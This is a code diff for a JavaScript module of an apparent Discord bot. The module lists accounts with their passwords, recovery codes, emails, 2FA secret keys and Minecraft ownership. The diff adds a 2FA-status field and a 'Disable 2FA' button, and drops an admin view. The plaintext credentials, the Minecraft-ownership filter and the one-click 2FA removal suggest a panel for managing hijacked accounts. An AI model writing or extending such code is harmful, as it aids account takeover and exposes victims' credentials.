@@ -33,35 +33,31 @@ module.exports = async (id, current, uid = null) => {
     const hideNonMC = userSettingsQuery[0]?.hidenonmc === 1;
 
     let userAccounts;
-    if (isAdmin) {
-        userAccounts = await queryParams("SELECT * FROM accounts");
-    } else {
-        let userUIDsQuery = "SELECT uid FROM accountsbyuser WHERE user_id=?";
-        let userUIDs = await queryParams(userUIDsQuery, [id]);
+    let userUIDsQuery = "SELECT uid FROM accountsbyuser WHERE user_id=?";
+    let userUIDs = await queryParams(userUIDsQuery, [id]);
 
-        if (!userUIDs || userUIDs.length === 0) {
-            msg.content = null;
-            embed.setTitle("No Accounts");
-            embed.setDescription("You don't have any accounts yet. Click the button below to add one.");
+    if (!userUIDs || userUIDs.length === 0) {
+        msg.content = null;
+        embed.setTitle("No Accounts");
+        embed.setDescription("You don't have any accounts yet. Click the button below to add one.");
 
-            let addAccountRow = new ActionRowBuilder().addComponents(
-                new ButtonBuilder()
-                    .setCustomId(`addaccount|${id}`)
-                    .setLabel("Add Account")
-                    .setStyle(ButtonStyle.Success)
-            );
-
-            msg.embeds = [embed];
-            msg.components = [addAccountRow];
-            return msg;
-        }
-
-        const placeholders = userUIDs.map(() => '?').join(', ');
-        userAccounts = await queryParams(
-            `SELECT * FROM accounts WHERE uid IN (${placeholders})`,
-            userUIDs.map(u => u.uid)
+        let addAccountRow = new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`addaccount|${id}`)
+                .setLabel("Add Account")
+                .setStyle(ButtonStyle.Success)
         );
+
+        msg.embeds = [embed];
+        msg.components = [addAccountRow];
+        return msg;
     }
+
+    const placeholders = userUIDs.map(() => '?').join(', ');
+    userAccounts = await queryParams(
+        `SELECT * FROM accounts WHERE uid IN (${placeholders})`,
+        userUIDs.map(u => u.uid)
+    );
 
     if (!userAccounts || userAccounts.length === 0) {
         msg.content = null;
@@ -285,6 +281,9 @@ module.exports = async (id, current, uid = null) => {
     msg.content = `UID: ${currentAccount.uid}`;
     embed.setTitle(statInfo);
 
+    const is2faDisabled = currentAccount.secretkey === "Disabled" || currentAccount.secretkey === "Option is disabled.";
+    const tfaDisplay = is2faDisabled ? "Disabled" : (currentAccount.secretkey ? "Enabled" : "Not set");
+
     embed.setFields([
         { name: "Username", value: `\`\`\`${currentAccount.username || "Not set"}\`\`\``, inline: true },
         { name: "Owns Minecraft", value: `\`\`\`${currentAccount.ownsmc || "No"}\`\`\``, inline: true },
@@ -292,6 +291,7 @@ module.exports = async (id, current, uid = null) => {
         { name: "Recovery Code", value: `\`\`\`${currentAccount.recoverycode || "Not set"}\`\`\``, inline: false },
         { name: "Primary Email", value: `\`\`\`${currentAccount.email || "Not set"}\`\`\``, inline: true },
         { name: "Secondary Email", value: `\`\`\`${currentAccount.secemail || "Not set"}\`\`\``, inline: true },
+        { name: "2FA Status", value: `\`\`\`${tfaDisplay}\`\`\``, inline: true },
         { name: "Secret Key", value: `\`\`\`${currentAccount.secretkey || "Not set"}\`\`\``, inline: true },
         { name: "Password", value: `\`\`\`${currentAccount.password || "Not set"}\`\`\``, inline: false },
     ]);
@@ -351,8 +351,13 @@ module.exports = async (id, current, uid = null) => {
             .setEmoji({ name: "🔑" }),
         new ButtonBuilder()
             .setCustomId(`extrainformation|${id}|${currentAccount.uid}`)
-            .setLabel("Extra Information")
-            .setStyle(ButtonStyle.Success)
+            .setLabel("Extra Info")
+            .setStyle(ButtonStyle.Success),
+        new ButtonBuilder()
+            .setCustomId(`disable2fa|${id}|${currentAccount.uid}`)
+            .setLabel(is2faDisabled ? "2FA Disabled" : "Disable 2FA")
+            .setStyle(is2faDisabled ? ButtonStyle.Secondary : ButtonStyle.Danger)
+            .setDisabled(is2faDisabled)
     );
     
 
